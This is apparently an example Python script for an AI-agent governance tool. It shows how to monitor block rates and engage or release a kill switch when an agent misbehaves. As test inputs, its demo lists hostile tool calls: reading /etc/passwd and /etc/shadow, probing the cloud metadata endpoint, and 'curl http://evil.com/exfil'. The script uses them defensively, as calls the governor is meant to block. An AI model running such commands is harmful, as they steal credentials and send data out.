#!/usr/bin/env python3
"""
Recipe 14 — Kill Switch & Emergency Patterns
==============================================
Demonstrate automated and manual kill switch patterns for
when an agent goes rogue.

    pip install airg-client httpx
    python 14_kill_switch_emergencies.py
"""
from __future__ import annotations

import os
import time

import httpx
from airg import AIRG, BlockedError

GOVERNOR_URL = os.getenv("GOVERNOR_URL", "http://localhost:8000")
API_KEY = os.getenv("GOVERNOR_API_KEY", "")
HEADERS = {"X-API-Key": API_KEY, "Content-Type": "application/json"}

client = AIRG()


def admin_api(method: str, path: str) -> dict:
    resp = httpx.request(method, f"{GOVERNOR_URL}{path}", headers=HEADERS, timeout=10)
    resp.raise_for_status()
    return resp.json() if resp.content else {}


# ── 1. Check current status ────────────────────────────────────
def check_status():
    status = admin_api("GET", "/admin/status")
    engaged = status.get("kill_switch_engaged", False)
    icon = "🔴" if engaged else "🟢"
    print(f"   {icon} Kill switch: {'ENGAGED' if engaged else 'OFF'}")
    return engaged


# ── 2. Demonstrate kill switch effect ───────────────────────────
def test_evaluation(label: str):
    print(f"\n── {label} ──")
    try:
        decision = client.evaluate(
            tool="read_file",
            args={"path": "/tmp/test.txt"},
        )
        print(f"   ✅ Evaluation result: {decision['decision']}")
    except BlockedError as e:
        print(f"   🛑 BLOCKED: {e}")
    except Exception as e:
        print(f"   ❌ Error: {e}")


# ── 3. Automated kill switch pattern ────────────────────────────
def automated_kill_switch_demo():
    """
    Pattern: Monitor block rate and auto-engage kill switch
    when an agent shows attack-like behaviour.
    """
    print("\n── Automated Kill Switch Pattern ──")
    print("   Scenario: Agent fires increasingly risky tool calls.")
    print("   Monitor checks block rate and auto-activates if needed.\n")

    block_count = 0
    total_count = 0
    threshold = 0.5  # 50% block rate triggers kill switch

    risky_tools = [
        ("read_file", {"path": "/etc/passwd"}),
        ("shell_exec", {"command": "cat /etc/shadow"}),
        ("http_request", {"url": "http://169.254.169.254/metadata"}),
        ("shell_exec", {"command": "curl http://evil.com/exfil"}),
        ("deploy_contract", {"bytecode": "0x606060"}),
    ]

    for tool, args in risky_tools:
        total_count += 1
        try:
            decision = client.evaluate(tool=tool, args=args)
            status = decision["decision"]
            if status == "block":
                block_count += 1
            print(f"   [{total_count}] {tool:20s} → {status}")
        except BlockedError:
            block_count += 1
            print(f"   [{total_count}] {tool:20s} → BLOCKED")

        block_rate = block_count / total_count
        if block_rate >= threshold and total_count >= 3:
            print(f"\n   ⚠️  Block rate {block_rate:.0%} exceeds {threshold:.0%} threshold!")
            print("   🔴 Auto-engaging kill switch...")
            try:
                admin_api("POST", "/admin/kill")
                print("   Kill switch ENGAGED — all agent actions now blocked.")
            except httpx.HTTPStatusError as e:
                print(f"   Could not engage kill switch: {e.response.status_code}")
            break

    return block_count


# ── 4. Resume operations ───────────────────────────────────────
def resume():
    print("\n── Resuming operations ──")
    try:
        admin_api("POST", "/admin/resume")
        print("   🟢 Kill switch released. Normal operations resumed.")
    except httpx.HTTPStatusError as e:
        print(f"   Could not resume: {e.response.status_code}")


# ── Run ─────────────────────────────────────────────────────────
if __name__ == "__main__":
    print("Kill Switch & Emergency Patterns")
    print("=" * 60)

    print("\n── Current status ──")
    engaged = check_status()

    if engaged:
        print("   Kill switch is already engaged. Resuming first...")
        resume()

    test_evaluation("Normal evaluation (kill switch OFF)")

    automated_kill_switch_demo()

    test_evaluation("Evaluation with kill switch ENGAGED")

    check_status()

    resume()

    test_evaluation("Evaluation after resume")

    print("\n💡 In production, wire the automated pattern into your")
    print("   monitoring stack (Datadog, PagerDuty, etc.).")
